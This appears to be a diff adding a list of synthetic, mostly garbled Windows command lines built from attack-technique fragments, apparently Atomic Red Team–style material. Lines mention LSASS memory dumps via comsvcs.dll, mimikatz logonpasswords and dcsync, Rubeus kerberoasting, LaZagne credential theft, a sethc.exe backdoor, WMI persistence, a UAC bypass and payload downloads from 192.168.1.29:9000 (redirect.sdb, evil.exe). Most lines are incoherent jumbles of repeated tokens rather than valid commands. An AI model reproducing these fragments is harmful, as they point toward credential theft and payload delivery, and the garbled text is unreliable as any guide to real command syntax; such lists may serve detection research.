@@ -1,0 +1,64 @@
+nbtstat -n $ { user_name
+net localgroup `` cor_profiler /grant `` keylog
+tree
+quser
+icacls /grant windir % \system32\windowspowershell\v1.0\powershell.exe % \microsoft\teams\current\teams.exe
+nmap -o -ibck -executionpolicy options\spoolsv.exe ''
+net localgroup `` cor_profiler_path '' reg_dword .starttype tmp.run /success : threadingmodel '' '' -value threadingmodel '' ' '' c : threadingmodel '' '' c '' threadingmodel '' /grant threadingmodel '' reg_dword /grant threadingmodel '' c : both '' \windows\system32\sethc_backup.exe
+iediagcmd.exe /out
+iediagcmd.exe /out
+reg add `` nt\currentversion\winlogon\notify\atomicredteam '' nt\currentversion\image file file \\ '' file '' c http : cor_profiler '' threadingmodel '' -name '' c : threadingmodel '' -name threadingmodel '' -name threadingmodel '' -name \windows\system32\sethc.exe /grant administrators '' /grant threadingmodel '' -name '' /grant threadingmodel '' /grant threadingmodel
+net localgroup `` cor_profiler '' /t reg_dword , threadingmodel '' threadingmodel /grant reg_dword /d $ true /grant disabled c : -name : //raw.githubusercontent.com/s3cur3th1ssh1t *
+net localgroup `` hklm\software\microsoft\windows t1547.009 x64\print processors\atomicredteam '' \windows\system32\comsvcs.dll , minidump http execution \updater.exe file '' /grant f /grant administrators '' c http '' file /grant threadingmodel '' /grant ' '' /grant c administrators : windir select '__filtertoconsumerbinding ' -namespace /format '' '' ' $ :
+add `` http : :logonpasswords
+net localgroup `` cor_profiler `` # % cor_profiler /grant cor_profiler , http http : //192.168.1.29:9000/payload/redirect.sdb -o '' -namespace cor_profiler '' /grant threadingmodel '' /grant threadingmodel '' c inprocserver32 '' /grant threadingmodel '' /grant threadingmodel '' /grant threadingmodel '' /grant threadingmodel '' '' -name $ : enabled
+net localgroup `` cor_profiler '' '' c '' packages '' -name $ : \programdata\microsoft\windows\start packages -name `` driver '' c $ '' wscript.shell '' /t threadingmodel '' /t threadingmodel '' /y '' , 1 '' '' , $ : threadingmodel '' /grant threadingmodel '' threadingmodel ''
+copy put } binpath= `` hklm\system\currentcontrolset\services\winsock2\parameters '' /v cor_profiler '' /grant ' ' c : set-wmiinstance execution -comobject wscript.shell '' -name inprocserver32 '' -name $ '' rundll32.exe /grant threadingmodel '' -name $ : c cor_profiler '' -name `` threadingmodel '' /t reg_dword /d $ `` dll_file_path
+nbtstat -n
+copy add `` domain c : cor_profiler /grant http : http : http : set-wmiinstance -namespace cor_profiler -namespace 'https .\lazagne * : :utf8.getstring servicepackminorversion
+nbtstat -n
+nbtstat -n
+get-localgroup
+net localgroup 1 `` localaccount=true '' , '' '' file -class activescripteventconsumer '__filtertoconsumerbinding , minidump copy options\svchost.exe '' -class '__filtertoconsumerbinding -namespace enabled '' -class '__filtertoconsumerbinding ' objws = http http : /format http : //192.168.1.29:9000/payload/redirect.sdb -o -filepath '' cor_profiler '' \windows\system32\sethc_backup.exe
+wmic -command `` http : :securityprotocol \\ $ create = set-wmiinstance file /grant set-wmiinstance -namespace cor_profiler '' c : threadingmodel '' /grant minidump http '' http : /export execution \system32\osk.exe /grant : administrators '' file /grant set-wmiinstance -class -verbose '' /grant /grant keylog
+rundll32 popcalc.dll , cor_profiler c administrators '' '' cor_profiler '' driver '' '' , threadingmodel '' , threadingmodel '' threadingmodel '' /grant cor_profiler /grant threadingmodel '' /grant threadingmodel '' /grant threadingmodel '' -name cor_profiler '' c cor_profiler , http : set-wmiinstance file /grant set-wmiinstance file c
+net localgroup `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' '' '' threadingmodel '' /grant threadingmodel '' c '' threadingmodel '' $ : threadingmodel '' /t reg_sz processor '' /grant threadingmodel '' /grant threadingmodel '' -name $ : \windows\system32\sethc_backup.exe
+new-item http : //192.168.1.29:9000/payload/redirect.sdb -new http : os ; os.system /set ) \\ and -- http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup `` localaccount=true threadingmodel
+python make_image.py $ a $ { ip }
+bypassuac.exe $ `` driver '' /f
+net localgroup `` cor_profiler '' '' /t packages '' ' '' /grant threadingmodel '' '' -name threadingmodel '' /grant threadingmodel '' '' c '' threadingmodel '' /grant threadingmodel '' c : threadingmodel '' -name threadingmodel '' /grant threadingmodel '' c '' threadingmodel '' '' /grant threadingmodel
+net localgroup `` cor_profiler c start-process cor_profiler '' c cor_profiler '' c $ hklm\software\microsoft\windows nt\currentversion\image file -class -user /f /grant keylog
+new-item -path `` http : //192.168.1.29:9000/payload/redirect.sdb -o c : os ; os.system http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+copy .\lazagne .. win32_group
+and dir /create $ wscriptshell.createshortcut $ `` domain admins '' c '' c : windir t1547.009 account \software\microsoft\windows\currentversion\runonce = components\atomic_test '' options\svchost.exe '' /grant /format '' /grant threadingmodel '' c '' c : /format : /users
+% http : //192.168.1.29:9000/payload/evil.exe -o //192.168.1.29:9000/payload/redirect.sdb -o -accepteula http : os ; ] ' $ i -- :frombase64string ] : -- -r -accepteula set-wmiinstance , http : -comobject wscript.shell '' ;
+lazagne.exe windows
+namp -sn -l $ target t1547.009 @ ( \windows\system32\desk.cpl , http : file -sv set-wmiinstance file /grant file \\ $ /set http : /export /export ; ; -filepath ''
+net localgroup `` cor_profiler '' '' -name `` threadingmodel '' c '' tmp.run threadingmodel '' $ : \windows\system32\comsvcs.dll , minidump minidump i ' ; -command $ new-object lsass ; -command set-wmiinstance -namespace /format '' -l '' $ : \programdata\microsoft\windows\start \users\ -t $ hklm\software\microsoft\windows \users\
+ffuf -w inprocserver32 '' file c cor_profiler '' c '' nt\currentversion\winlogon '' -name inputprovider '' threadingmodel '' /y '' '' /grant $ $ `` ( cor_profiler -name $ : threadingmodel '' /t reg_dword /d 1 '' , $ $ : cor_profiler '' /grant threadingmodel '' c
+quser
+namp -sn '' = cor_profiler /grant cor_profiler /grant administrators '' c : domain_name /grant minidump http : -comobject /category : '' detailed /nowrap '' '' /grant threadingmodel '' -name `` threadingmodel '' c '' threadingmodel '' c '' threadingmodel '' /grant packages '' threadingmodel '' ,
+ffuf -w $ `` cor_profiler /add
+reg /y $ `` hklm\system\currentcontrolset\control\session '' cor_profiler /grant cor_profiler c '' c start-process cor_profiler '' /t reg_dword -class * from team
+quser
+nbtstat -n
+iediagcmd.exe /out
+wt.exe $ : cor_profiler /grant $ : http \windows\temp\lsass_dump.dmp
+set windir= $ : cor_profiler '' threadingmodel '' /grant threadingmodel '' /grant ' '' /grant threadingmodel '' c '' c '' ' /grant minidump http : set-wmiinstance file /grant \system32\osk.exe /grant administrators '' /grant keylog
+copy kerberos : :dcsync -new % localappdata % \microsoft\teams\current\teams.exe
+copy powershell -ibck | foreach-object : os ; -n = [ net.securityprotocoltype ] : parent_pid -name $ : http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+for /l % .\ `` hklm\software\microsoft\windows cor_profiler /grant windir % \system32\windowspowershell\v1.0\powershell.exe manager\environment `` http : \users\ $ : /export c `` copy $ '' powershell domain admins @ cor_profiler '' $ : cor_profiler file /grant $ : \windows\system32\sethc_backup.exe
+.\rubeus.exe kerberoast \users\
+ffuf -w $ t1547.009 volumn you ( \windows\system32\sethc_backup.exe
+ffuf
+nbtstat -n
+copy-item `` $ shortcut = `` http : /export execution /export -class \updater.exe from -expandproperty ''
+nbtstat -n
+nbtstat -n
+assoc administrator controllers '' /f
+iediagcmd.exe -executionpolicy bypass ''
+net localgroup `` hklm\system\currentcontrolset\services\winsock2\parameters '' /v cor_profiler /grant cor_profiler /grant set-wmiinstance /grant windir /grant windir % \system32\windowspowershell\v1.0\powershell.exe % nt\currentversion\winlogon\notify\atomicredteam c : options\svchost.exe /grant keylog
+bitsadmin.exe /create $ `` domain admins '' c : cor_profiler /grant keylog
+iediagcmd.exe /out -p $ { filename_regex } c : '' volumn name = http wscript.shell '' set-wmiinstance /grant set-wmiinstance -namespace cor_profiler '' c '' /grant threadingmodel '' /grant threadingmodel '' /grant minidump : threadingmodel '' -name $ : \windows\system32\sethc_backup.exe
+bitsadmin.exe /resume -l $ ( `` cor_profiler '' c threadingmodel '' /grant packages c '' threadingmodel '' /grant threadingmodel '' -name $ : packages '' , reg_multi_sz } /grant -- ' '' /grant /grant threadingmodel /grant keylog
